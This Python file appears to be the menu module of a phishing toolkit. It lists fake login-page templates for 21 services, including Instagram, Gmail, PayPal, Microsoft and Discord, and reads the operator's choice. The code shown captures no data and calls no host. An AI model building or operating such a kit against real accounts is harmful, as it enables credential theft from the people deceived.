from core.ui import clear, logo, title, question

def start():
    while True:
        clear()
        logo()
        title("Pishing - Templates\n")

        print("[1] Instagram          [2] Facebook            [3] Snapchat")
        print("[4] Twitter            [5] GitHub              [6] Gmail")
        print("[7] Spotify            [8] Netflix             [9] PayPal")
        print("[10] Microsoft         [11] Steam              [12] Yahoo")
        print("[13] LinkedIn          [14] Protonmail         [15] Wordpress")
        print("[16] Pinterest         [17] Twitch             [18] Discord")
        print("[19] Disney +          [20] Star +             [21] Hbo max")

        templates = {
            '1':'instagram',
            '2': 'facebook',
            '3': 'snapchat',
            '4': 'twitter',
            '5': 'github',
            '6': 'Gmail',
            '7': 'spotify',
            '8': 'netflix',
            '9': 'paypal',
            '10': 'Microsoft',
            '11': 'steam',
            '12': 'yahoo',
            '13': 'linkedin',
            '14': 'protonmail',
            '15': 'wordpress',
            '16': 'Pinterest',
            '17': 'Twitch',
            '18': 'Discord',
            '19': 'Disney +',
            '20': 'Star +',
            '21': 'Hbo max',
            }

        phishing = int(input("Selecione um template\n⤷ "))

        response = question()
        if response == 1:
            clear()
            continue
        else:
            clear()
            break

